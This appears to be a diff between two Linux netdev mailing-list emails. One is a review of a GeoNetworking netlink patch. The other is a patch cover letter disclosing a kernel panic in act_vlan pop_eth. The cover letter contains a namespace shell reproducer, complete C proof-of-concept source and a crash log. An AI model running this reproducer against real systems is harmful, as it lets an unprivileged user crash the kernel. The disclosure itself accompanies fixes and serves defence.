@@ -1,118 +1,246 @@
-Received: from vps0.lunn.ch (vps0.lunn.ch [156.67.10.101])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
+Received: from mail-pj1-f51.google.com (mail-pj1-f51.google.com [209.85.216.51])
+	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DFD02397699
-	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:54:28 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=156.67.10.101
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 19920397691
+	for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 17:55:00 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.51
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1784829271; cv=none; b=UIlpi/hEQmZ+3X2n9MLxqX40nsizB37ONFZexNZ42WR8dfUpgM+Nfu5cXrSURHvgqyuJCKXu49/9PrCRS4M8WrnWO1YhpSFQLqiPE/kjEK+Nhf6wmNpwBC9TnQb/SPbi64OykQ3jmFNN/Xkm5mmGVE+soD2ZftYIAqLSlqS5ZfA=
+	t=1784829303; cv=none; b=emQNzkzVjUXRQf1XiezSSsN2K03PJ+rR3zssraK/JDkgPC+juBvfIzBJrSkMVHxZLMN8Un7Jqz3k0Rb/hjwZ0MIbftP/kxotwRnvrKzJZqpgB2eq/gwZi8EXRKGe7+TPTzUdgt2berPk6+3THXJCZ5nAjRIxWFrMAJUev09YGgY=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1784829271; c=relaxed/simple;
-	bh=aXbFVMwbsy89WMJi4M6ofrvLQhU/Sd6HhEuV0TUJxtI=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:Content-Disposition:In-Reply-To; b=DGy2tz3PV3+uRUoZprS+FXF+g64Idlb/LFlKSOkkoyb8za7QBRz5Vqf5k9pzZaAL4/mmnqeQjdUE2QQV02sJB9/KdNIaUQwkmcui31lKGMw7wZ4feRlCBMqyjU0ndOluavbgHofy3qGtLPUv5eXz0dNUbY/2l+pKjnX2DyDopDc=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=lunn.ch; spf=pass smtp.mailfrom=lunn.ch; dkim=pass (1024-bit key) header.d=lunn.ch header.i=@lunn.ch header.b=ngEpsH8u; arc=none smtp.client-ip=156.67.10.101
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=lunn.ch
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=lunn.ch
+	s=arc-20240116; t=1784829303; c=relaxed/simple;
+	bh=f/tbKbAM4yDX230q7PCUeeY5wXtDieHeLaAdbixrYxI=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=kIuFoKBkDodrjfhFtg++HDb7ZrHS1e+tanJAqM2TlO+lVdp4oI8sg8BSS1NHDUMrPDSCHd+aV14Cx5+Ii9PFhYwKJUnuR3bNQct/I5q0v1WjC016kJ/LCRpFA1cAUC81zkTFzsWoNJpEjCFFV5/iGZXqoI9MauTSvtkStnxAN3g=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=FdCifN3q; arc=none smtp.client-ip=209.85.216.51
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=lunn.ch header.i=@lunn.ch header.b="ngEpsH8u"
-DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=lunn.ch;
-	s=20171124; h=In-Reply-To:Content-Disposition:Content-Type:MIME-Version:
-	References:Message-ID:Subject:Cc:To:From:Date:From:Sender:Reply-To:Subject:
-	Date:Message-ID:To:Cc:MIME-Version:Content-Type:Content-Transfer-Encoding:
-	Content-ID:Content-Description:Content-Disposition:In-Reply-To:References;
-	bh=ZbzbnSKfemHGxXgudekc1cG/2HLRqNyx/mDK7R4rdHY=; b=ngEpsH8uxChwdbLyIAjF5uiSS/
-	X9CziBL2JGRO5KgyntOehmIzJA5QL9+5sdGW8jyI2NyDN3mdrf8hT12c/dOM6T3L3Om2pfNnbSFlv
-	WwDo94xq7Zh2ZjzTyFBzsDfK2YBYitZeOooiBEK012v38s1RB/T7ZJw4FPWziBXZMK0c=;
-Received: from andrew by vps0.lunn.ch with local (Exim 4.94.2)
-	(envelope-from <andrew@lunn.ch>)
-	id 1wmxcn-00Drnt-Bn; Thu, 23 Jul 2026 19:54:25 +0200
-Date: Thu, 23 Jul 2026 19:54:25 +0200
-From: Andrew Lunn <andrew@lunn.ch>
-To: Simon Dietz <simon.dietz@plantwatch.de>
-Cc: andrew+netdev@lunn.ch, netdev@vger.kernel.org, dietz23838@hs-ansbach.de
-Subject: Re: [RFC PATCH net-next v0.1 1/1] net: add GeoNetworking protocol
-Message-ID: <22fa2ec2-7db9-48f0-b03a-47826239d07c@lunn.ch>
-References: <88182be4-f7c2-4012-8661-881415124a15@lunn.ch>
- <20260723171219.2293282-1-simon.dietz@plantwatch.de>
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="FdCifN3q"
+Received: by mail-pj1-f51.google.com with SMTP id 98e67ed59e1d1-38dc4553f62so1002438a91.0
+        for <netdev@vger.kernel.org>; Thu, 23 Jul 2026 10:55:00 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1784829299; x=1785434099; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=+2NlHFRpS6kgtmx1AoEINdeSGFQVkdLZGJGAyvcdzdU=;
+        b=FdCifN3qzDw8QqGdjffOHDINpoCWySPj4nwXwUqFB7JtYb0UhXODb9vCzanhB3YERN
+         lgncAv9KOl1jq+xTX2G6ABLrev04jvaPujUpj8z9lPOS446sdW9Wiv9o7dGkr/hH+MQP
+         JkldkL3LtEcHDtP4uNzxDdxBvaq+4W/T/oPXv7rYiXKIcZiJcYmn966V7FB9OFANUPpQ
+         nwx5G7xa23lRRshG+lPqmfISMc+46vR9QT05ea+IPJjdXNOEBNkUYMfa0VvdIYRxYFw7
+         I+xGe/qoXcDZKvIvltTKiM//2LM+965+3/iIfo5S0rJXqeHvtwM1mGHHHJA7Q1+r1mch
+         MBag==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1784829299; x=1785434099;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=+2NlHFRpS6kgtmx1AoEINdeSGFQVkdLZGJGAyvcdzdU=;
+        b=UYXbICzng0iSLsJmTDqadsN1t6Jv0XDv8Q4wuYjnwhr9mjwYTjlCqkwp49DJWY+iM5
+         x+8k4MPoH0hxKc3sOdimG+m2a2XMPjPZW8IxYDndopCjkx2fj2/YKWSLz3PXwiEpwMYs
+         1qJRqHOnDiir2lnm3OFukULd2moWAD1x8oF3xqsOMzh1hNcJsjBr+sTL17tm9DcN03Sj
+         drZWCGr3o+wdRN8kZstl7qAhIeu/d7iJJwdTX45EanmHQtZ9d+t2/4FqKusvOZSU8WHb
+         gDQAHXl64dEMrFdP2klzgBLMFzy161u6L0M4ZLCb0vmhFSxzl4NcguZ/wbOTSrxdXdI5
+         oitA==
+X-Gm-Message-State: AOJu0Yy/gkZB1El80KuVgRLjrayBm9UzOEivPmncskV8NqT/2bx+vEoC
+	RBknmIXH5Fwrb14TNL12SRQtWSsSvtfJKbectiAAPK0DtX6rVktWTEZpy1Acy84m/9E=
+X-Gm-Gg: AR+sD11oKwd3TReaeqf5lKrUGfGM2sYoPSJeaR5xHoMIxFqaS/V6a+RWhFsFxchA+HY
+	VuR983ak60A+9K9tmGpd4bcH6FK72TqclmS3cL8eRkwZvs8k2ZvwgpUb8Bsuo33aSFFepr+yXzn
+	1gkETpquZ2bHxft0yZrtTItibMWgDs1FErGH1rFyH1lJWMWupjpmm3yx+G8CdKCABYm5HQ1YL5H
+	I3XF8chMKH49lXMLMoHvcc7n0DpG7qKp5lUT7WG74f81Nz30bk33J11ljjHCc29FWTDcfZRKPb/
+	R1MN1yl43jCS3SqPZk9SQ3ef8WYMPBHHoozb+emaYfXfyEIsXMSiR6TXjvDIyv5K0wdyZtDEI6h
+	Lpq6tTAjOCTabY3v7TPcUGRS8h3WeLBlpU7RoOSJKvt7evonJw8opMn5OYFwh7V4GD6uAhjeP8S
+	bFRJW7GvAL7DyvyHXtn/wK4UVl9PlLeYd53IU0VWNR
+X-Received: by 2002:a17:90b:1b01:b0:38e:57a3:f218 with SMTP id 98e67ed59e1d1-38ec64f272dmr4548909a91.13.1784829299321;
+        Thu, 23 Jul 2026 10:54:59 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([167.71.204.91])
+        by smtp.gmail.com with ESMTPSA id a92af1059eb24-13d130262d2sm15943883c88.7.2026.07.23.10.54.52
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Thu, 23 Jul 2026 10:54:58 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: netdev@vger.kernel.org
+Cc: jhs@mojatatu.com,
+	jiri@resnulli.us,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	peilin.ye@bytedance.com,
+	cong.wang@bytedance.com,
+	gnault@redhat.com,
+	vega@nebusec.ai,
+	bronzed_45_vested@icloud.com,
+	enjou1224z@gmail.com
+Subject: [PATCH net v2 0/2] net/sched: act_vlan: pop_eth can strip non-Ethernet skbs and panic loopback
+Date: Fri, 24 Jul 2026 01:54:46 +0800
+Message-ID: <cover.1784709375.git.bronzed_45_vested@icloud.com>
+X-Mailer: git-send-email 2.51.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <20260723171219.2293282-1-simon.dietz@plantwatch.de>
+Content-Transfer-Encoding: 8bit
 
-On Thu, Jul 23, 2026 at 07:12:19PM +0200, Simon Dietz wrote:
-> > Passing a binary structure as a netlink attribute is not going to fly.
-> 
-> More like this (using generic netlink)?
-> 
-> static const struct nla_policy gn_coord_policy[GN_COORD_MAX + 1] = {
-> 	[GN_COORD_LAT] = { .type = NLA_S32 },
-> 	[GN_COORD_LON] = { .type = NLA_S32 },
-> };
+From: Wyatt Feng <bronzed_45_vested@icloud.com>
 
-It would be good to add some documentation somewhere what this S32
-represents. I normally see LAT and LOG represented as floating
-points. I _think_ i read somewhere in the standard that over the air
-messages user 1/10 of a degree?
+Hi Linux kernel maintainers,
 
-> 
-> static const struct nla_policy gn_genl_policy[GN_ATTR_MAX + 1] = {
-> 	[GN_ATTR_COORD] = NLA_POLICY_NESTED(gn_coord_policy),
-> };
-> 
-> static int gn_get_position(struct sk_buff *skb, struct genl_info *info)
-> /* ... */
-> 
->     nest = nla_nest_start(reply_skb, GN_ATTR_COORD);
-> 	if (!nest) {
-> 		nlmsg_free(reply_skb);
-> 		return -EMSGSIZE;
-> 	}
-> 
-> 	if (nla_put_s32(reply_skb, GN_COORD_LAT, val.lat) ||
-> 	    nla_put_s32(reply_skb, GN_COORD_LON, val.lon)) {
-> 		nlmsg_free(reply_skb);
-> 		return -EMSGSIZE;
-> 	}
-> 	nla_nest_end(reply_skb, nest);
+We found an issue in net/sched/act_vlan.c.
+The bug is reachable by an unprivileged user using private user and network namespaces.
+The relevant details are provided below.
 
-Is a nest needed? I'm not a netlink expert, but my understanding was
-you use nests when you have lists, and each member of the list has a
-collections of attributes. Do you have a list here, or is it just one
-location.
+---- details below ----
 
-> > This also does not feel correct. Why is location a property of an
-> > interface? Can one machines interfaces be in different locations?
-> 
-> I would answer: Unfortunately, yes. Consider a 700m long train (which
-> is the upper limit of train length in europe, in US there may be even
-> longer ones). It is one vehicle, but may have at least two gn (wifi)
-> devices, one at the front and one at the back. That is a niche use case
-> but it is one.
+Bug details:
 
-O.K, makes sense. Although i would think it is more likely to be two
-vehicles with some level of coupling.
+The bug is in `tcf_vlan_act()` when handling `TCA_VLAN_ACT_POP_ETH`.
+The action is applied without checking that the skb is on an Ethernet
+device. On loopback and other non-Ethernet devices, `skb_eth_pop()`
+removes `ETH_HLEN` bytes from the skb head even though the later TX path
+still expects an Ethernet header.
 
-> That of course would make the implementation a bit more difficult
-> because if the position is saved for each device, then the gn address
-> must be passed along with the position so that the kernel is able to
-> map the via netlink passed position to the right device, which affects
-> the kernel / user space interface.
+When such a packet is transmitted through `lo`, `loopback_xmit()` calls
+`eth_type_trans()`, which unconditionally pulls another `ETH_HLEN`
+bytes. For a large non-linear AF_PACKET skb whose linear head contains
+only the original Ethernet header, the first pull leaves
+`skb_headlen(skb) == 0`. The second pull then reaches `__skb_pull()`
+with `skb->len < skb->data_len` and triggers a kernel BUG, crashing the
+guest.
 
-This is the nice thing about netlink. You can additional attributes
-later, the device the position is applied to. So at the moment you
-walk all the interfaces and set their position. In the future, if the
-ifindex attribute is included you only set that one device.
+This is a short-packet handling bug caused by applying an Ethernet-only
+transform to a non-Ethernet skb.
 
-This however brings us back to the routing table. If the location is
-strictly a property of the interface, the routing table is also a
-property of an interface? Forwarding on the same interface, and
-forwarding on a different interface are different operations? Does the
-standard say anything about multi-interface devices?
+Reproducer:
 
-	 Andrew
+PATH=/usr/sbin:/usr/bin:/sbin:/bin gcc -O2 -Wall -x c -o mini_poc.bin mini_poc
+PATH=/usr/sbin:/usr/bin:/sbin:/bin unshare -Urn sh -euxc '
+ip link set lo up
+trap "tc qdisc del dev lo clsact 2>/dev/null || true" EXIT
+tc qdisc add dev lo clsact
+tc filter add dev lo egress pref 1 protocol all flower \
+  action vlan pop_eth \
+  action skbmod dmac 02:11:22:33:44:55 pipe
+./mini_poc.bin
+'
+
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN PoC------
+
+#include <arpa/inet.h>
+#include <net/ethernet.h>
+#include <net/if.h>
+#include <netpacket/packet.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+int main(void)
+{
+	struct sockaddr_ll sll;
+	unsigned char *frame;
+	size_t len = ETH_HLEN + 8192;
+	int fd;
+
+	frame = malloc(len);
+	if (!frame) {
+		perror("malloc");
+		return 1;
+	}
+
+	memset(frame, 'A', len);
+	frame[0] = 0xaa;
+	frame[1] = 0xbb;
+	frame[2] = 0xcc;
+	frame[3] = 0xdd;
+	frame[4] = 0xee;
+	frame[5] = 0xff;
+	frame[6] = 0x11;
+	frame[7] = 0x22;
+	frame[8] = 0x33;
+	frame[9] = 0x44;
+	frame[10] = 0x55;
+	frame[11] = 0x66;
+	frame[12] = 0x08;
+	frame[13] = 0x00;
+
+	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
+	if (fd < 0) {
+		perror("socket");
+		return 1;
+	}
+
+	memset(&sll, 0, sizeof(sll));
+	sll.sll_family = AF_PACKET;
+	sll.sll_protocol = htons(ETH_P_IP);
+	sll.sll_ifindex = if_nametoindex("lo");
+	if (!sll.sll_ifindex) {
+		perror("if_nametoindex");
+		return 1;
+	}
+
+	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0) {
+		perror("bind");
+		return 1;
+	}
+
+	if (send(fd, frame, len, 0) < 0) {
+		perror("send");
+		return 1;
+	}
+
+	close(fd);
+	free(frame);
+	return 0;
+}
+
+
+------END PoC--------
+
+----BEGIN crash log----
+
+[  138.618799][ T9361] __skb_pull(len=14)
+[  138.619387][ T9361] skb len=8192 data_len=8192 headroom=16 headlen=0 tailroom=0
+[  138.619387][ T9361] end-tail=368 mac=(16,0) mac_len=0 net=(16,-1) trans=-1
+[  138.619387][ T9361] shinfo(txflags=0 nr_frags=1 gso(size=0 type=0 segs=0))
+[  138.625465][ T9361] dev name=lo feat=0x0000052e401d4c69
+[  138.646157][ T9361] ------------[ cut here ]------------
+[  138.646805][ T9361] kernel BUG at include/linux/skbuff.h:2847!
+[  138.647529][ T9361] Oops: invalid opcode: 0000 [#1] SMP KASAN NOPTI
+[  138.648307][ T9361] CPU: 1 UID: 1001 PID: 9361 Comm: mini_poc.bin Not tainted 7.1.0-13910-g6c00e85cd46f #1 PREEMPT(full)
+[  138.650828][ T9361] RIP: 0010:eth_type_trans.cold+0x2c/0x30
+[  138.662853][ T9361]  <TASK>
+[  138.663655][ T9361]  loopback_xmit+0x21b/0x6e0
+[  138.672320][ T9361]  packet_xmit+0x243/0x310
+[  138.672878][ T9361]  packet_sendmsg+0x319a/0x5100
+[  138.680374][ T9361]  __x64_sys_sendto+0xe0/0x1c0
+[  138.707494][ T9361] Kernel panic - not syncing: Fatal exception in interrupt
+
+
+-----END crash log-----
+
+Best regards,
+Wyatt Feng
+
+Changes since v1:
+Link: https://lore.kernel.org/r/3ab4a04fbab887238facc1792e02c33fd68190f7.1782548651.git.bronzed_45_vested@icloud.com
+Link: https://lore.kernel.org/r/40fe2d7dfce13411bfbe9271c0f7c54fb7e88e3b.1782548651.git.bronzed_45_vested@icloud.com
+- Kept the actual code changes unchanged from the previous version.
+- Reworded both commit messages to more clearly describe the failure
+  mode and the exact header-length checks.
+- Consolidated the Reported-by tags to Vega <vega@nebusec.ai>.
+
+
+Wyatt Feng (2):
+  net/sched: act_skbmod: require a full Ethernet header for MAC rewrites
+  net/sched: act_vlan: skip pop_eth on non-Ethernet devices
+
+ net/sched/act_skbmod.c | 9 +++++++--
+ net/sched/act_vlan.c   | 4 ++++
+ 2 files changed, 11 insertions(+), 2 deletions(-)
+
+-- 
+2.47.3
